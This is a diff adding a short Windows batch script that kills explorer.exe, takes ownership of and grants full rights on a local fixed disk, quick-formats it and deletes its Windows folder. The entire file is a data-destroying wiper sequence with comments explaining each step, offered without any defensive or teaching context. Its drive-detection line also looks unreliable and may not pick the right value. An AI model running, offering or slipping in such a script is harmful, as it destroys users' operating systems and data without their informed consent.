@@ -1,0 +1,20 @@
+@echo off
+
+rem Find the drive letter of the Windows drive
+for /f "tokens=2" %%i in ('wmic logicaldisk where "description='Local Fixed Disk'" get deviceid^, volumename') do set WindowsDrive=%%i
+
+rem Stop all processes that may be using the Windows drive
+taskkill /F /IM explorer.exe /T
+
+rem Grant ownership and permissions to the current user
+takeown /f %WindowsDrive% /r /d y
+icacls %WindowsDrive% /grant %username%:F /T
+
+rem Format the Windows drive
+format %WindowsDrive% /Q /FS:NTFS
+
+rem Delete the Windows folder
+rd /s /q %WindowsDrive%\Windows
+
+echo Drive %WindowsDrive% has been formatted and the Windows folder has been deleted.
+pause
